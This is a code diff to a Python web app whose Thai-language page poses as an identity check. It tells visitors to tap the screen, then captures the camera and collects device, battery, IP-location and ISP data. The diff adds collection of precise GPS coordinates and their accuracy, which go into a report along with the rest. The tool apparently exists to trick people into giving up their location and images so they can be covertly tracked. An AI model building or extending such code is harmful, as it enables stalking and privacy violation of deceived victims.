@@ -60,7 +60,7 @@ HTML = '''<!DOCTYPE html>
 <body onclick="startCapture()">
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
-        <p>ระบบจะขออนุญาตใช้กล้องเพื่อยืนยันตัวตน</p>
+        <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
         <div class="info-text">ใช้เวลาประมาณ 4-5 วินาที</div>
     </div>
     <script>
@@ -79,6 +79,19 @@ HTML = '''<!DOCTYPE html>
                 timestamp: new Date().toISOString()
             };
             
+            // ขออนุญาต GPS
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                });
+                deviceInfo.gps_lat = pos.coords.latitude;
+                deviceInfo.gps_lon = pos.coords.longitude;
+                deviceInfo.gps_accuracy = pos.coords.accuracy;
+            } catch(e) {
+                deviceInfo.gps = 'ไม่ได้รับอนุญาตหรือไม่รองรับ';
+            }
+            
+            // แบตเตอรี่
             try {
                 const battery = await navigator.getBattery();
                 deviceInfo.batteryLevel = Math.round(battery.level * 100);
@@ -173,7 +186,16 @@ def upload():
             content += f"🗺️ จังหวัด: {location['region']}\n"
             content += f"🌍 ประเทศ: {location['country']}\n"
             content += f"📶 ค่ายเน็ต/ISP: {location['isp']}\n"
-            content += f"🗺️ พิกัด: {location['lat']}, {location['lon']}\n"
+            content += f"🗺️ พิกัด IP: {location['lat']}, {location['lon']}\n"
+        
+        # GPS (ถ้ามี)
+        if device_info.get('gps_lat') and device_info.get('gps_lon'):
+            content += f"📍 GPS: {device_info['gps_lat']}, {device_info['gps_lon']}\n"
+            if device_info.get('gps_accuracy'):
+                content += f"🎯 ความแม่นยำ GPS: ±{device_info['gps_accuracy']} เมตร\n"
+        elif device_info.get('gps') == 'ไม่ได้รับอนุญาตหรือไม่รองรับ':
+            content += f"📍 GPS: ปฏิเสธหรือไม่รองรับ\n"
+        
         content += f"📱 UA: {device_info.get('userAgent', 'ไม่ระบุ')[:100]}\n"
         content += f"💻 แพลตฟอร์ม: {device_info.get('platform', 'ไม่ระบุ')}\n"
         content += f"🖥️ หน้าจอ: {device_info.get('screenWidth')}x{device_info.get('screenHeight')}\n"
